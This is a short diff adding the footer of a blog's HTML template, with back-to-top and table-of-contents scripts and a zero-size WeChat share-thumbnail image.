+<!-- Baidu Tongji -->
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<img src="http://yoursite-url/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
